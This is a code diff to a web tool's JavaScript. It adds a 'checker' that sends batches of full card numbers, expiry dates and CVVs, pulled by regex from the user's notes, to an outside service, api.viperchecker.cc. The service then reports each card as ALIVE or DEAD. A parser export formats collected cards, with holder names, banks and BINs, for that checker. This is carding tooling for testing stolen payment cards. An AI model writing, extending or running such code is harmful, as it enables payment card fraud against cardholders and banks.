@@ -3165,11 +3165,36 @@ function changeNotesFontSize(delta) {
 // ──── CHECKER ────
 const checkerOverlay = document.getElementById('checker-overlay');
 
+const VIPER_BASE = 'https://api.viperchecker.cc';
+
+function getViperToken() {
+    return document.getElementById('checker-token')?.value || localStorage.getItem('viper_token') || '';
+}
+
+function saveViperToken() {
+    const token = document.getElementById('checker-token')?.value || '';
+    if (token) localStorage.setItem('viper_token', token);
+}
+
 function openChecker() {
     checkerOverlay.classList.remove('hidden');
     document.body.style.overflow = 'hidden';
-    document.getElementById('checker-input').value = '';
     document.getElementById('checker-output').textContent = 'Results will appear here...';
+    document.getElementById('checker-status-badge').textContent = '';
+
+    // Restore saved token
+    const savedToken = localStorage.getItem('viper_token') || '';
+    document.getElementById('checker-token').value = savedToken;
+
+    // Auto-load checker-format cards from Notes
+    const notes = STATE.notes || '';
+    const checkerRegex = /(\d{13,19})\s+(0?[1-9]|1[012])\s+(\d{2,4})\s+(\d{3,4})/g;
+    const cardLines = [];
+    let m;
+    while ((m = checkerRegex.exec(notes)) !== null) {
+        cardLines.push(m[0]);
+    }
+    document.getElementById('checker-input').value = cardLines.join('\n');
     document.getElementById('checker-input').focus();
 }
 
@@ -3178,103 +3203,171 @@ function closeChecker() {
     document.body.style.overflow = '';
 }
 
-function convertCards() {
-    const input = document.getElementById('checker-input').value;
-    if (!input.trim()) {
-        document.getElementById('checker-output').textContent = 'Paste card data first...';
+async function viperRequest(path, method, body) {
+    saveViperToken();
+    const token = getViperToken();
+    if (!token) { toast('Enter your Viper API token', 'warning'); return null; }
+
+    const opts = {
+        method,
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`
+        }
+    };
+    if (body) opts.body = JSON.stringify(body);
+
+    try {
+        const res = await fetch(`${VIPER_BASE}${path}`, opts);
+        if (!res.ok) {
+            const err = await res.json().catch(() => ({ Error: `HTTP ${res.status}` }));
+            toast(`Viper Error: ${err.Error || res.statusText}`, 'error');
+            return null;
+        }
+        return await res.json();
+    } catch (e) {
+        toast(`Network error: ${e.message}`, 'error');
+        return null;
+    }
+}
+
+async function viperBalance() {
+    const data = await viperRequest('/profile/balance', 'POST');
+    if (data) {
+        document.getElementById('checker-balance').textContent = `${data.balance} checks`;
+        toast(`Balance: ${data.balance} checks`, 'info');
+    }
+}
+
+async function viperLoadMethods() {
+    const data = await viperRequest('/check/available', 'GET');
+    if (data && data.result) {
+        const sel = document.getElementById('checker-method');
+        sel.innerHTML = data.result.map(m =>
+            `<option value="${m.code}">${m.code} — ${m.description}</option>`
+        ).join('');
+        toast(`Loaded ${data.result.length} check methods`, 'success');
+    }
+}
+
+async function checkCardsViper() {
+    const input = document.getElementById('checker-input').value.trim();
+    if (!input) { toast('No cards to check', 'warning'); return; }
+
+    const lines = input.split('\n').filter(l => l.trim());
+    if (lines.length === 0) { toast('No valid card lines', 'warning'); return; }
+    if (lines.length > 30) { toast('Max 30 cards per request', 'warning'); return; }
+
+    const checkType = document.getElementById('checker-method').value || 'AUTH';
+    const outputEl = document.getElementById('checker-output');
+    const statusEl = document.getElementById('checker-status-badge');
+    const runBtn = document.getElementById('checker-run');
+
+    outputEl.textContent = '⏳ Sending to Viper...';
+    statusEl.textContent = 'CHECKING...';
+    statusEl.className = 'checker-status-badge checking';
+    runBtn.disabled = true;
+
+    // Use v2 API + polling
+    const v2Data = await viperRequest('/check/v2', 'POST', {
+        data: lines,
+        check_type: checkType
+    });
+
+    if (!v2Data) {
+        outputEl.textContent = 'Error: Failed to send cards.';
+        statusEl.textContent = 'ERROR';
+        statusEl.className = 'checker-status-badge error';
+        runBtn.disabled = false;
         return;
     }
 
-    const results = [];
-    const lines = input.split('\n');
-
-    // Collect all numbers, looking for card patterns
-    let currentCard = { num: '', mm: '', yy: '', cvv: '' };
-
-    for (const line of lines) {
-        const cleaned = line.trim();
-        if (!cleaned) continue;
-
-        // Try to extract all digits from any format
-        // Pattern: full card number (13-19 digits)
-        const cardMatch = cleaned.match(/(\d[\d\s]{11,22}\d)/);
-        if (cardMatch) {
-            if (currentCard.num) {
-                // Push previous card if complete
-                if (currentCard.num.length >= 13) {
-                    results.push(`${currentCard.num} ${currentCard.mm} ${currentCard.yy} ${currentCard.cvv}`.trim());
-                }
-                currentCard = { num: '', mm: '', yy: '', cvv: '' };
-            }
-            currentCard.num = cardMatch[1].replace(/\s/g, '');
-
-            // Check if same line has MM/YY and CVV
-            const rest = cleaned.replace(cardMatch[0], '');
-            const expMatch = rest.match(/(\d{2})[/\s-](\d{2,4})/);
-            if (expMatch) {
-                currentCard.mm = expMatch[1];
-                currentCard.yy = expMatch[2].slice(-2);
-            }
-            const cvvMatch = rest.match(/(?:CVV|cvv|CVC|cvc)[:\s]*(\d{3,4})/) || rest.match(/(\d{3,4})\s*$/);
-            if (cvvMatch) currentCard.cvv = cvvMatch[1];
-            continue;
-        }
-
-        // Try validity/expiry pattern
-        const validityMatch = cleaned.match(/(?:Validity|Exp(?:iry)?|EXP|Valid)[:\s]*(\d{2})[/\s-](\d{2,4})/i);
-        if (validityMatch) {
-            currentCard.mm = validityMatch[1];
-            currentCard.yy = validityMatch[2].slice(-2);
-            continue;
-        }
-
-        // Try CVV pattern
-        const cvvLine = cleaned.match(/(?:CVV|CVC|Security)[:\s]*(\d{3,4})/i);
-        if (cvvLine) {
-            currentCard.cvv = cvvLine[1];
-            continue;
-        }
-
-        // Try standalone expiry (MM/YY on its own line)
-        const standalonExp = cleaned.match(/^(\d{2})[/](\d{2,4})$/);
-        if (standalonExp) {
-            currentCard.mm = standalonExp[1];
-            currentCard.yy = standalonExp[2].slice(-2);
-            continue;
-        }
-
-        // Try standalone 3-digit number (CVV)
-        const standaloneCvv = cleaned.match(/^(\d{3,4})$/);
-        if (standaloneCvv && currentCard.num) {
-            currentCard.cvv = standaloneCvv[1];
-            continue;
-        }
-
-        // Try all-in-one format: 4221740051682165 02 30 290
-        const allInOne = cleaned.match(/(\d{13,19})\s+(\d{2})\s+(\d{2,4})\s+(\d{3,4})/);
-        if (allInOne) {
-            results.push(`${allInOne[1]} ${allInOne[2]} ${allInOne[3].slice(-2)} ${allInOne[4]}`);
-            continue;
-        }
+    // Show invalid items immediately
+    let resultLines = [];
+    if (v2Data.invalid_items && v2Data.invalid_items.length > 0) {
+        v2Data.invalid_items.forEach(item => {
+            resultLines.push(formatCheckerResult(item));
+        });
     }
 
-    // Push last card
-    if (currentCard.num && currentCard.num.length >= 13) {
-        results.push(`${currentCard.num} ${currentCard.mm} ${currentCard.yy} ${currentCard.cvv}`.trim());
+    const purchaseId = v2Data.purchase_id;
+    if (!purchaseId) {
+        // No purchase_id = all invalid
+        outputEl.innerHTML = resultLines.join('\n') || 'All cards were invalid.';
+        statusEl.textContent = 'DONE';
+        statusEl.className = 'checker-status-badge done';
+        runBtn.disabled = false;
+        return;
     }
 
-    document.getElementById('checker-output').textContent = results.length
-        ? results.join('\n')
-        : 'No card data found. Check your input format.';
+    // Poll for results
+    outputEl.textContent = '⏳ Polling for results...';
+    let attempts = 0;
+    const maxAttempts = 60; // 5 min with 5s interval
+
+    const poll = async () => {
+        attempts++;
+        const pollData = await viperRequest(`/check/poll/${purchaseId}`, 'GET');
+        if (!pollData) {
+            statusEl.textContent = 'POLL ERROR';
+            statusEl.className = 'checker-status-badge error';
+            runBtn.disabled = false;
+            return;
+        }
+
+        if (pollData.status === 'confirmed' || attempts >= maxAttempts) {
+            // Final results
+            if (pollData.result) {
+                pollData.result.forEach(item => {
+                    resultLines.push(formatCheckerResult(item));
+                });
+            }
+            outputEl.innerHTML = resultLines.join('\n') || 'No results returned.';
+
+            const alive = resultLines.filter(l => l.includes('ALIVE')).length;
+            const dead = resultLines.filter(l => l.includes('DEAD')).length;
+            statusEl.textContent = `✅ ${alive} ALIVE  💀 ${dead} DEAD`;
+            statusEl.className = 'checker-status-badge done';
+            runBtn.disabled = false;
+        } else {
+            // Still pending
+            outputEl.textContent = `⏳ Polling... (attempt ${attempts}/${maxAttempts})`;
+            setTimeout(poll, 5000);
+        }
+    };
+    setTimeout(poll, 3000);
 }
 
-document.getElementById('checker-convert').addEventListener('click', convertCards);
+function formatCheckerResult(item) {
+    const card = item.card || '';
+    const status = (item.status || '').toUpperCase();
+    const isAlive = status === 'ALIVE';
+    const icon = isAlive ? '✅' : status === 'DEAD' ? '💀' : '⚠️';
+    const details = item.details || '';
+    const brand = item.brand || '';
+    const type = item.type || '';
+    const level = item.level || '';
+    const country = item.country || '';
+
+    return `<span class="chk-${isAlive ? 'alive' : 'dead'}">${icon} ${card} - ${status}</span>
+├ Status code - ${details}
+├ Система - ${brand}
+├ Тип - ${type}
+├ Уровень - ${level}
+└ Код региона - ${country}
+`;
+}
+
+// ──── Checker Event Listeners ────
+document.getElementById('checker-run').addEventListener('click', checkCardsViper);
 document.getElementById('checker-copy').addEventListener('click', () => {
     const text = document.getElementById('checker-output').textContent;
     navigator.clipboard.writeText(text).then(() => toast('Copied!', 'success'));
 });
 document.getElementById('checker-close').addEventListener('click', closeChecker);
 document.getElementById('checker-cancel').addEventListener('click', closeChecker);
+document.getElementById('checker-balance-btn').addEventListener('click', viperBalance);
+document.getElementById('checker-load-methods').addEventListener('click', viperLoadMethods);
 checkerOverlay.addEventListener('click', (e) => { if (e.target === checkerOverlay) closeChecker(); });
 
 // ──── DROPDOWN MENUS ────
@@ -3854,17 +3947,78 @@ function addCollectedToNotes() {
     const list = PARSER_STATE.collected;
     if (PARSER_STATE.selected.size === 0) { toast('No cards selected', 'warning'); return; }
 
+    // Show format selection modal
+    const modal = document.createElement('div');
+    modal.className = 'modal-overlay';
+    modal.innerHTML = `
+        <div class="modal-content" style="max-width:420px">
+            <h3 style="margin:0 0 12px;font-size:15px;color:var(--c-text-primary)">📝 Choose Export Format</h3>
+            <div class="format-options">
+                <button class="format-option-btn" data-format="full">
+                    <span class="format-icon">📋</span>
+                    <span class="format-label">Full Info</span>
+                    <span class="format-desc">💳 CC, 📅 Validity, 🔐 CVV, 👶 Holder, 🏦 Bank, 📊 Type</span>
+                </button>
+                <button class="format-option-btn" data-format="checker">
+                    <span class="format-icon">🔍</span>
+                    <span class="format-label">Checker Format</span>
+                    <span class="format-desc">4242424242424242 03 27 111</span>
+                </button>
+                <button class="format-option-btn" data-format="raw">
+                    <span class="format-icon">📄</span>
+                    <span class="format-label">Raw Data</span>
+                    <span class="format-desc">Name | CC | Exp | BIN | Bank | GEO</span>
+                </button>
+            </div>
+            <button class="btn-outline" id="format-cancel" style="width:100%;margin-top:8px;padding:6px">Cancel</button>
+        </div>`;
+    document.body.appendChild(modal);
+
+    modal.querySelector('#format-cancel').addEventListener('click', () => modal.remove());
+    modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
+
+    modal.querySelectorAll('.format-option-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const format = btn.dataset.format;
+            modal.remove();
+            executeAddToNotes(format);
+        });
+    });
+}
+
+function executeAddToNotes(format) {
+    const list = PARSER_STATE.collected;
     const lines = [];
     const addedIndices = new Set();
+
     PARSER_STATE.selected.forEach(idx => {
         const c = list[idx];
         if (!c) return;
-        lines.push(`${c.name} ${c.surname} | ${c.cc} | ${c.validity} | BIN:${c.bin} | ${c.bank || '-'} | ${c.detectedGeo || '-'}`);
+
+        const ccClean = (c.cc || '').replace(/\s/g, '');
+        const mm = (c.mm || '').padStart(2, '0');
+        const yy = c.yy || '';
+        const cvv = c.cvv || '000';
+
+        if (format === 'full') {
+            lines.push(`💳 CC: ${ccClean}`);
+            lines.push(`📅 Validity: ${c.validity}`);
+            lines.push(`🔐 CVV: ${cvv}`);
+            lines.push(`👶 Holder: ${c.name} ${c.surname}`);
+            lines.push(`🏦 Bank: ${c.bank || '-'}`);
+            lines.push(`📊 Card Type: ${c.cardType || c.detectedGeo || '-'}`);
+            lines.push('');
+        } else if (format === 'checker') {
+            lines.push(`${ccClean} ${mm} ${yy} ${cvv}`);
+        } else {
+            lines.push(`${c.name} ${c.surname} | ${c.cc} | ${c.validity} | BIN:${c.bin} | ${c.bank || '-'} | ${c.detectedGeo || '-'}`);
+        }
         addedIndices.add(idx);
     });
 
     if (lines.length > 0) {
-        const header = `\n--- Parser Import (${new Date().toLocaleDateString()}) ---`;
+        const formatLabel = format === 'full' ? 'Full Info' : format === 'checker' ? 'Checker' : 'Raw';
+        const header = `\n--- Parser Import [${formatLabel}] (${new Date().toLocaleDateString()}) ---`;
         const block = header + '\n' + lines.join('\n');
         STATE.notes = (STATE.notes || '') + block + '\n';
         STATE.notesLastSaved = Date.now();
@@ -3880,7 +4034,7 @@ function addCollectedToNotes() {
 
         saveData();
         renderParserResults();
-        toast(`${lines.length} cards added to Notes`, 'success');
+        toast(`${addedIndices.size} cards added to Notes (${formatLabel})`, 'success');
     }
 }
 
